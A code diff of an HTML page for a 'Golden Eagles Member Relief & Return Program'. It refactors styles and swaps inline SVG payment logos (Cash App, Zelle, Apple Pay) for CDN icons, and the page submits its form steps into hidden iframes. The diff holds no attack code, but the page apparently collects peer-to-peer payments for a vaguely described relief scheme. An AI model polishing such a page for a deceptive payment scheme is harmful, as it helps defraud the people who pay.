@@ -4,29 +4,17 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Golden Eagles Member Relief & Return Program</title>
+
   <style>
     :root{
       --navy-1:#07111f;
-      --navy-2:#0c1830;
-      --navy-3:#13284a;
-      --navy-4:#1a3762;
-
       --gold-1:#f7e7b8;
-      --gold-2:#e6c97a;
       --gold-3:#cfa44a;
       --gold-4:#b88528;
       --gold-5:#8d6317;
-
-      --white:#ffffff;
-      --off:#f7f8fb;
       --ink:#102038;
       --muted:#62728c;
-      --line:#dbe3ef;
       --line-gold:rgba(207,164,74,.42);
-
-      --success:#1e7a53;
-      --danger:#b42318;
-
       --shadow-deep:0 30px 80px rgba(0,0,0,.28);
       --shadow-soft:0 18px 45px rgba(8,18,35,.12);
       --shadow-gold:0 12px 30px rgba(184,133,40,.25);
@@ -91,7 +79,6 @@
       border-radius:999px;
       color:var(--gold-1);
       background:linear-gradient(180deg, rgba(8,16,28,.34), rgba(8,16,28,.18));
-      box-shadow:inset 0 1px 0 rgba(255,255,255,.08);
       letter-spacing:.14em;
       text-transform:uppercase;
       font-size:12px;
@@ -189,7 +176,6 @@
       font-weight:700;
       letter-spacing:.1em;
       text-transform:uppercase;
-      box-shadow:inset 0 1px 0 rgba(255,255,255,.07);
     }
 
     .card-top h2{
@@ -235,16 +221,12 @@
       font-weight:600;
     }
 
-    .card-body{
-      padding:28px;
-    }
+    .card-body{padding:28px}
 
     .screen{display:none}
     .screen.active{display:block}
 
-    .section-header{
-      margin-bottom:18px;
-    }
+    .section-header{margin-bottom:18px}
 
     .section-title{
       margin:0 0 8px;
@@ -390,8 +372,6 @@
       border:1px solid #d7e0ee;
     }
 
-    .btn-soft:hover{background:#e7eef8}
-
     .form-wrap{
       margin-top:18px;
       padding:22px;
@@ -417,9 +397,7 @@
       letter-spacing:.01em;
     }
 
-    .input-shell{
-      position:relative;
-    }
+    .input-shell{position:relative}
 
     input, textarea{
       width:100%;
@@ -441,19 +419,13 @@
       resize:vertical;
     }
 
-    input:hover, textarea:hover{
-      border-color:#c2cedf;
-    }
-
     input:focus, textarea:focus{
       border-color:rgba(207,164,74,.78);
       box-shadow:0 0 0 4px rgba(207,164,74,.14), 0 10px 22px rgba(184,133,40,.08);
       transform:translateY(-1px);
     }
 
-    .payment-select{
-      position:relative;
-    }
+    .payment-select{position:relative}
 
     .payment-select-trigger{
       width:100%;
@@ -518,9 +490,7 @@
       display:none;
     }
 
-    .payment-select-menu.open{
-      display:block;
-    }
+    .payment-select-menu.open{display:block}
 
     .payment-option{
       width:100%;
@@ -538,17 +508,9 @@
       font-weight:600;
     }
 
-    .payment-option:last-child{
-      border-bottom:none;
-    }
-
-    .payment-option:hover{
-      background:#fafcff;
-    }
-
-    .payment-option.active{
-      background:#fffaf1;
-    }
+    .payment-option:last-child{border-bottom:none}
+    .payment-option:hover{background:#fafcff}
+    .payment-option.active{background:#fffaf1}
 
     .payment-option-check{
       margin-left:auto;
@@ -557,18 +519,7 @@
       opacity:0;
     }
 
-    .payment-option.active .payment-option-check{
-      opacity:1;
-    }
-
-    .hidden-native{
-      position:absolute !important;
-      width:1px !important;
-      height:1px !important;
-      opacity:0 !important;
-      pointer-events:none !important;
-      left:-9999px !important;
-    }
+    .payment-option.active .payment-option-check{opacity:1}
 
     .selected-method-visual{
       display:none;
@@ -582,9 +533,7 @@
       box-shadow:0 8px 18px rgba(16,40,74,.04);
     }
 
-    .selected-method-visual.active{
-      display:flex;
-    }
+    .selected-method-visual.active{display:flex}
 
     .selected-method-text{
       display:flex;
@@ -639,9 +588,7 @@
       border-bottom:1px solid rgba(207,164,74,.14);
     }
 
-    .summary-box-premium .summary-row:last-child{
-      border-bottom:none;
-    }
+    .summary-box-premium .summary-row:last-child{border-bottom:none}
 
     .summary-box-premium .summary-label{
       font-weight:800;
@@ -655,13 +602,8 @@
       word-break:break-word;
     }
 
-    .payment-method-box{
-      display:none;
-    }
-
-    .payment-method-box.active{
-      display:block;
-    }
+    .payment-method-box{display:none}
+    .payment-method-box.active{display:block}
 
     .payment-method-box h4{
       margin:0;
@@ -684,9 +626,7 @@
       line-height:1.7;
     }
 
-    .payment-method-box-premium{
-      margin-top:20px;
-    }
+    .payment-method-box-premium{margin-top:20px}
 
     .meta-list{
       display:grid;
@@ -777,10 +717,7 @@
       color:#a33a2d;
     }
 
-    .side-shell{
-      display:grid;
-      gap:18px;
-    }
+    .side-shell{display:grid;gap:18px}
 
     .side-card{
       padding:22px;
@@ -830,42 +767,59 @@
     }
 
     .brand-logo{
-      width:28px;
-      height:28px;
-      min-width:28px;
+      width:30px;
+      height:30px;
+      min-width:30px;
       display:inline-flex;
       align-items:center;
       justify-content:center;
-      border-radius:999px;
+      border-radius:10px;
       overflow:hidden;
       box-shadow:0 2px 8px rgba(10,20,35,.08);
       border:1px solid rgba(16,40,74,.08);
       background:#fff;
+      padding:5px;
     }
 
     .brand-logo.brand-lg{
-      width:34px;
-      height:34px;
-      min-width:34px;
+      width:38px;
+      height:38px;
+      min-width:38px;
+      border-radius:12px;
+      padding:6px;
     }
 
-    .brand-logo svg{
+    .brand-logo.cashapp{
+      background:#00D632;
+    }
+
+    .brand-logo.zelle{
+      background:#6D1ED4;
+    }
+
+    .brand-logo.applepay{
+      background:#111111;
+    }
+
+    .brand-logo img{
       width:100%;
       height:100%;
+      object-fit:contain;
       display:block;
+      filter:brightness(0) invert(1);
+    }
+
+    .brand-logo.applepay img{
+      filter:brightness(0) invert(1);
     }
 
     @media (max-width: 960px){
-      .layout{
-        grid-template-columns:1fr;
-      }
+      .layout{grid-template-columns:1fr}
     }
 
     @media (max-width: 700px){
       .benefit-grid,
-      .form-grid{
-        grid-template-columns:1fr;
-      }
+      .form-grid{grid-template-columns:1fr}
 
       .page-wrap{
         width:min(100% - 18px, 1200px);
@@ -915,20 +869,13 @@
         padding:10px 0;
       }
 
-      .summary-box-premium .summary-label{
-        font-size:14px;
-      }
-
-      .summary-box-premium .summary-value{
-        font-size:15px;
-      }
-
-      .form-wrap-premium{
-        padding:18px;
-      }
+      .summary-box-premium .summary-label{font-size:14px}
+      .summary-box-premium .summary-value{font-size:15px}
+      .form-wrap-premium{padding:18px}
     }
   </style>
 </head>
+
 <body>
   <iframe name="hidden_iframe_step2"></iframe>
   <iframe name="hidden_iframe_step3"></iframe>
@@ -1003,30 +950,22 @@
                 <div class="accepted-label">Accepted Payment Methods</div>
                 <div class="method-list">
                   <span class="method-pill">
-                    ${''}
-                    <span class="brand-logo" aria-hidden="true">
-                      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="64" height="64" rx="18" fill="#00D632"/>
-                        <path d="M41 15c-8 0-13 4-15 10h-7v8h5c0 7 4 16 17 16 4 0 8-1 10-2l-2-7c-2 1-4 2-7 2-5 0-8-3-8-9h14v-8H34c1-3 3-4 7-4 2 0 4 0 6 1l2-7c-2 0-5-1-8-1z" fill="#fff"/>
-                      </svg>
+                    <span class="brand-logo cashapp">
+                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/cashapp.svg" alt="Cash App logo">
                     </span>
                     Cash App
                   </span>
+
                   <span class="method-pill">
-                    <span class="brand-logo" aria-hidden="true">
-                      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="64" height="64" rx="18" fill="#6D1ED4"/>
-                        <path d="M17 20h30L24 44h23" fill="none" stroke="#fff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
-                      </svg>
+                    <span class="brand-logo zelle">
+                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/zelle.svg" alt="Zelle logo">
                     </span>
                     Zelle
                   </span>
+
                   <span class="method-pill">
-                    <span class="brand-logo" aria-hidden="true">
-                      <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="64" height="64" rx="18" fill="#111111"/>
-                        <path d="M39 19c-2 1-3 3-3 5 0 2 1 4 3 5 2-1 3-3 3-5 0-2-1-4-3-5zm-7 12c-3 0-6 2-8 5-2 4-1 8 1 11 2 3 5 5 8 5 3 0 4-1 6-1 2 0 3 1 6 1 3 0 5-2 7-5 1-2 2-4 2-6-4-1-6-4-6-7 0-3 2-6 5-7-2-3-5-4-7-4-3 0-5 2-6 2-2 0-4-1-8-1z" fill="#fff"/>
-                      </svg>
+                    <span class="brand-logo applepay">
+                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/applepay.svg" alt="Apple Pay logo">
                     </span>
                     Apple Pay
                   </span>
@@ -1146,33 +1085,24 @@
 
                         <div class="payment-select-menu" id="paymentMethodMenu">
                           <button type="button" class="payment-option" data-value="Cash App">
-                            <span class="brand-logo" aria-hidden="true">
-                              <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                                <rect width="64" height="64" rx="18" fill="#00D632"/>
-                                <path d="M41 15c-8 0-13 4-15 10h-7v8h5c0 7 4 16 17 16 4 0 8-1 10-2l-2-7c-2 1-4 2-7 2-5 0-8-3-8-9h14v-8H34c1-3 3-4 7-4 2 0 4 0 6 1l2-7c-2 0-5-1-8-1z" fill="#fff"/>
-                              </svg>
+                            <span class="brand-logo cashapp">
+                              <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/cashapp.svg" alt="Cash App logo">
                             </span>
                             <span>Cash App</span>
                             <span class="payment-option-check">✓</span>
                           </button>
 
                           <button type="button" class="payment-option" data-value="Zelle">
-                            <span class="brand-logo" aria-hidden="true">
-                              <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                                <rect width="64" height="64" rx="18" fill="#6D1ED4"/>
-                                <path d="M17 20h30L24 44h23" fill="none" stroke="#fff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
-                              </svg>
+                            <span class="brand-logo zelle">
+                              <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/zelle.svg" alt="Zelle logo">
                             </span>
                             <span>Zelle</span>
                             <span class="payment-option-check">✓</span>
                           </button>
 
                           <button type="button" class="payment-option" data-value="Apple Pay">
-                            <span class="brand-logo" aria-hidden="true">
-                              <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                                <rect width="64" height="64" rx="18" fill="#111111"/>
-                                <path d="M39 19c-2 1-3 3-3 5 0 2 1 4 3 5 2-1 3-3 3-5 0-2-1-4-3-5zm-7 12c-3 0-6 2-8 5-2 4-1 8 1 11 2 3 5 5 8 5 3 0 4-1 6-1 2 0 3 1 6 1 3 0 5-2 7-5 1-2 2-4 2-6-4-1-6-4-6-7 0-3 2-6 5-7-2-3-5-4-7-4-3 0-5 2-6 2-2 0-4-1-8-1z" fill="#fff"/>
-                              </svg>
+                            <span class="brand-logo applepay">
+                              <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/applepay.svg" alt="Apple Pay logo">
                             </span>
                             <span>Apple Pay</span>
                             <span class="payment-option-check">✓</span>
@@ -1224,11 +1154,8 @@
 
               <div class="payment-method-box payment-method-box-premium" id="cashAppBox">
                 <div class="method-heading">
-                  <span class="brand-logo brand-lg" aria-hidden="true">
-                    <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                      <rect width="64" height="64" rx="18" fill="#00D632"/>
-                      <path d="M41 15c-8 0-13 4-15 10h-7v8h5c0 7 4 16 17 16 4 0 8-1 10-2l-2-7c-2 1-4 2-7 2-5 0-8-3-8-9h14v-8H34c1-3 3-4 7-4 2 0 4 0 6 1l2-7c-2 0-5-1-8-1z" fill="#fff"/>
-                    </svg>
+                  <span class="brand-logo brand-lg cashapp">
+                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/cashapp.svg" alt="Cash App logo">
                   </span>
                   <h4>Cash App</h4>
                 </div>
@@ -1244,11 +1171,8 @@
 
               <div class="payment-method-box payment-method-box-premium" id="zelleBox">
                 <div class="method-heading">
-                  <span class="brand-logo brand-lg" aria-hidden="true">
-                    <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                      <rect width="64" height="64" rx="18" fill="#6D1ED4"/>
-                      <path d="M17 20h30L24 44h23" fill="none" stroke="#fff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
+                  <span class="brand-logo brand-lg zelle">
+                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/zelle.svg" alt="Zelle logo">
                   </span>
                   <h4>Zelle</h4>
                 </div>
@@ -1261,11 +1185,8 @@
 
               <div class="payment-method-box payment-method-box-premium" id="applePayBox">
                 <div class="method-heading">
-                  <span class="brand-logo brand-lg" aria-hidden="true">
-                    <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-                      <rect width="64" height="64" rx="18" fill="#111111"/>
-                      <path d="M39 19c-2 1-3 3-3 5 0 2 1 4 3 5 2-1 3-3 3-5 0-2-1-4-3-5zm-7 12c-3 0-6 2-8 5-2 4-1 8 1 11 2 3 5 5 8 5 3 0 4-1 6-1 2 0 3 1 6 1 3 0 5-2 7-5 1-2 2-4 2-6-4-1-6-4-6-7 0-3 2-6 5-7-2-3-5-4-7-4-3 0-5 2-6 2-2 0-4-1-8-1z" fill="#fff"/>
-                    </svg>
+                  <span class="brand-logo brand-lg applepay">
+                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/applepay.svg" alt="Apple Pay logo">
                   </span>
                   <h4>Apple Pay</h4>
                 </div>
@@ -1397,43 +1318,29 @@
   </div>
 
   <script>
+    const LOGOS = {
+      "Cash App": {
+        url: "https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/cashapp.svg",
+        cls: "cashapp",
+        alt: "Cash App logo"
+      },
+      "Zelle": {
+        url: "https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/zelle.svg",
+        cls: "zelle",
+        alt: "Zelle logo"
+      },
+      "Apple Pay": {
+        url: "https://cdn.jsdelivr.net/npm/simple-icons@v11/icons/applepay.svg",
+        cls: "applepay",
+        alt: "Apple Pay logo"
+      }
+    };
+
     function getMethodLogoMarkup(method, sizeClass = '') {
-      const cls = sizeClass ? `brand-logo ${sizeClass}` : 'brand-logo';
-
-      if (method === 'Cash App') {
-        return `
-          <span class="${cls}" aria-hidden="true">
-            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-              <rect width="64" height="64" rx="18" fill="#00D632"/>
-              <path d="M41 15c-8 0-13 4-15 10h-7v8h5c0 7 4 16 17 16 4 0 8-1 10-2l-2-7c-2 1-4 2-7 2-5 0-8-3-8-9h14v-8H34c1-3 3-4 7-4 2 0 4 0 6 1l2-7c-2 0-5-1-8-1z" fill="#fff"/>
-            </svg>
-          </span>
-        `;
-      }
-
-      if (method === 'Zelle') {
-        return `
-          <span class="${cls}" aria-hidden="true">
-            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-              <rect width="64" height="64" rx="18" fill="#6D1ED4"/>
-              <path d="M17 20h30L24 44h23" fill="none" stroke="#fff" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-          </span>
-        `;
-      }
-
-      if (method === 'Apple Pay') {
-        return `
-          <span class="${cls}" aria-hidden="true">
-            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
-              <rect width="64" height="64" rx="18" fill="#111111"/>
-              <path d="M39 19c-2 1-3 3-3 5 0 2 1 4 3 5 2-1 3-3 3-5 0-2-1-4-3-5zm-7 12c-3 0-6 2-8 5-2 4-1 8 1 11 2 3 5 5 8 5 3 0 4-1 6-1 2 0 3 1 6 1 3 0 5-2 7-5 1-2 2-4 2-6-4-1-6-4-6-7 0-3 2-6 5-7-2-3-5-4-7-4-3 0-5 2-6 2-2 0-4-1-8-1z" fill="#fff"/>
-            </svg>
-          </span>
-        `;
-      }
-
-      return '';
+      const item = LOGOS[method];
+      if (!item) return '';
+      const cls = sizeClass ? `brand-logo ${sizeClass} ${item.cls}` : `brand-logo ${item.cls}`;
+      return `<span class="${cls}"><img src="${item.url}" alt="${item.alt}"></span>`;
     }
 
     function showScreen(number){
